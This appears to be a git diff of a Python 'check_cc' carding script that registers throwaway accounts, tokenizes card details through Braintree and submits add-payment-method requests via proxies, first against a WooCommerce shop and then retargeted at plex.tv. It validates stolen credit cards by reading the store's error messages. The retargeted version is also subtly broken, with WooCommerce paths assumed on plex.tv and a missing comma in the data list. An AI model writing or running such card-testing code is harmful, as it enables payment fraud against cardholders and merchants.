@@ -167,32 +167,17 @@ async def check_cc(cc_details):
 
     try:
         async with aiohttp.ClientSession() as session:
-            async with session.get('http://www.bebebrands.com/my-account/', headers=headers, proxy=proxies['http'] if proxies else None, ssl=False) as r:
+            async with session.get('https://www.plex.tv/sign-up/', headers=headers, proxy=proxies['http'] if proxies else None, ssl=False) as r:
                 text = await r.text()
                 reg = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', text).group(1)
 
             data = {
-                'username': username, 'email': acc, 'password': 'SandeshThePapa@',
-                'woocommerce-register-nonce': reg, '_wp_http_referer': '/my-account/', 'register': 'Register'
+                'email': acc, 'password': '@ElectraOp@272',
+                'woocommerce-register-nonce': reg, '_wp_http_referer': '/sign-up/', 'register': 'Register'
             }
-            async with session.post('http://www.bebebrands.com/my-account/', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as r:
-                pass
+            
 
-            async with session.get('http://www.bebebrands.com/my-account/edit-address/billing/', headers=headers, proxy=proxies['http'] if proxies else None) as r:
-                text = await r.text()
-                address_nonce = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', text).group(1)
-
-            data = {
-                'billing_first_name': first_name, 'billing_last_name': last_name, 'billing_country': 'GB',
-                'billing_address_1': street_address, 'billing_city': city, 'billing_postcode': zip_code,
-                'billing_phone': num, 'billing_email': acc, 'save_address': 'Save address',
-                'woocommerce-edit-address-nonce': address_nonce,
-                '_wp_http_referer': '/my-account/edit-address/billing/', 'action': 'edit_address'
-            }
-            async with session.post('https://www.bebebrands.com/my-account/edit-address/billing/', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as r:
-                pass
-
-            async with session.get('http://www.bebebrands.com/my-account/add-payment-method/', headers=headers, proxy=proxies['http'] if proxies else None) as r:
+            async with session.get('https://account.plex.tv/payments/add', headers=headers, proxy=proxies['http'] if proxies else None) as r:
                 text = await r.text()
                 add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', text).group(1)
                 client_nonce = re.search(r'client_token_nonce":"([^"]+)"', text).group(1)
@@ -200,7 +185,7 @@ async def check_cc(cc_details):
             data = {
                 'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_nonce
             }
-            async with session.post('http://www.bebebrands.com/wp-admin/admin-ajax.php', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as r:
+            async with session.post('http://account.plex.tv/wp-admin/admin-ajax.php', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as r:
                 token_resp = await r.json()
                 enc = token_resp['data']
                 dec = base64.b64decode(enc).decode('utf-8')
@@ -220,17 +205,18 @@ async def check_cc(cc_details):
                 tok = (await r.json())['data']['tokenizeCreditCard']['token']
 
             headers.update({
-                'authority': 'www.bebebrands.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-                'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://www.bebebrands.com',
-                'referer': 'http://www.bebebrands.com/my-account/add-payment-method/'
+                'authority': 'www.account.plex.tv', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+                'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://account.plex.tv/',
+                'referer': 'https://account.plex.tv/en-GB/payments/add/'
             })
             data = [
                 ('payment_method', 'braintree_credit_card'), ('wc-braintree-credit-card-card-type', 'master-card'),
                 ('wc_braintree_credit_card_payment_nonce', tok), ('wc_braintree_device_data', '{"correlation_id":"ca769b8abef6d39b5073a87024953791"}'),
                 ('wc-braintree-credit-card-tokenize-payment-method', 'true'), ('woocommerce-add-payment-method-nonce', add_nonce),
-                ('_wp_http_referer', '/my-account/add-payment-method/'), ('woocommerce_add_payment_method', '1')
+                ('_wp_http_referer', '/en-GB/payments/add/'), ('woocommerce_add_payment_method', '1')
+                ('billing_country', 'US'), ('postal_code', '10002')
             ]
-            async with session.post('http://www.bebebrands.com/my-account/add-payment-method/', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as response:
+            async with session.post('https://account.plex.tv/en-GB/payments/add/', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as response:
                 text = await response.text()
                 soup = BeautifulSoup(text, 'html.parser')
                 error_message = soup.select_one('.woocommerce-error .message-container')
